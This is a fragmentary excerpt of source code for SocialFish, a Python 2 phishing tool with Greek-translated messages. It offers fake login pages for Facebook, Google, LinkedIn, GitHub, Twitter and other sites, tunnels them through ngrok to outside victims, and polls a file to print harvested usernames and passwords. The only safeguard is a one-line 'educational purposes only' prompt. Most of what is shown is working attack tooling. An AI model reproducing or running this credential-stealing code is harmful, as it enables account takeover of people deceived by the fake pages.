...
if connected() == False:
  ...
  ....._____.......     ____ ____ ____ _ ____ _       ____ _ ____ _  _ 
      ...
      \o__  /\|         ___] |__| |___ | |  | |___    |    | ___] |  |
          \|           
                    {0}[{1}!{0}]{1} Σφάλμα δικτύου. Διασφαλίστε ύπαρξη σύνδεσης δικτύου.\n
'''.format(RED, END)
     exit(0)

def checkNgrok():
    if path.isfile('Διακομιστής/ngrok') == False: 
        print '[*] Κατέβασμα Ngrok...'
...
{1}[ {0}Βρείτε μας στο YouTube:{1} https://youtube.com/c/UndeadSec ]

[ {0}Ακολουθήστε στο Twitter:{1} https://twitter.com/A1S0N_ ]

[ {0}Συνεισφέρετε μέσω του Github:{1} https://github.com/UndeadSec/SocialFish ]

[ {0}Εγγραφείτε στο γκρουπ μας στο Telegram(Πορτογαλικά):{1} https://t.me/UndeadSec ]\n'''.format(GREEN, END, CYAN)
...
(          _.  < 
 ...
 [{1}*{0}]{1} %s το module φόρτωσε. Κατασκευή σελίδας...{0}'''.format(CYAN, END) % module
...
def waitCreds():
    print " {0}[{1}*{0}]{1} Αναμονή για διαπιστευτήρια... \n".format(GREEN, END)
    while True:
        with open('Server/www/cat.txt') as creds:
            lines = creds.read().rstrip()
        if len(lines) != 0: 
            print ' {0}[ ΒΡΕΘΗΚΑΝ ΔΙΑΠΙΣΤΕΥΤΗΡΙΑ ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
...
def runPEnv():
  ...
  ███████ ████████ ███████ ██ ██   ██ ███████  ██      ██ ███████ ██   ██ 
    ...
    for i in range(101):
        sleep(0.01)
        stdout.write("\r{0}[{1}*{0}]{1} Προετοιμασία περιβάλοντος... %d%%".format(CYAN, END) % i)
        stdout.flush()
   
    print "\n\n{0}[{1}*{0}]{1} Αναζήτηση εγκατάστασης PHP... ".format(CYAN, END) 
    if 256 != system('which php'):
        print " --{0}>{1} OK.".format(CYAN, END)
    else:
	print " --{0}>{1} PHP NOT FOUND: \n {0}*{1} Παρακαλώ εγκαταστήστε την PHP και προσπαθήστε ξανά. http://www.php.net/".format(RED, END)
        exit(0)
    if raw_input(" {0}[{1}!{0}]{1} Συμφωνείτε οτι θα χρησιμοποήσετε το πρόγραμμα αποκλειστικά για εκπαιδευτικούς σκοπούς? (y/n)\n {2}SF > {1}".format(RED, END, CYAN)).upper() != 'Y':
        system('clear')
        print '\n[ {0}ΔΕΝ ΕΧΕΤΕ ΕΓΚΡΙΣΗ ΝΑ ΧΡΗΣΙΜΟΠΟΙΗΣΕΤΕ ΑΥΤΟ ΤΟ ΕΡΓΑΛΕΙΟ{1} ]\n'.format(RED, END)
        exit(0)
    option = raw_input("\nΚάντε μία επιλογή:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIn\n\n {0}[{1}4{0}]{1} Github\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}[{1}7{0}]{1} Twitter\n\n {0}SF >  {1}".format(CYAN, END))
    if option == '1':
        loadModule('Facebook')
        option2 = raw_input("\nΤρόπος Λειτουργίας:\n\n {0}[{1}1{0}]{1} Κανονικό Page Phishing\n\n {0}[{1}2{0}]{1} Προηγμένο Phishing(poll_mode/login_with)\n\n {0}SF > {1}".format(CYAN, END))
...
def runNgrok():
    ...
    print('\n {0}[{1}*{0}]{1} Διεύθυνση Ngrok: {2}' + url.read() + '{1}').format(CYAN, END, GREEN)
    url.close()
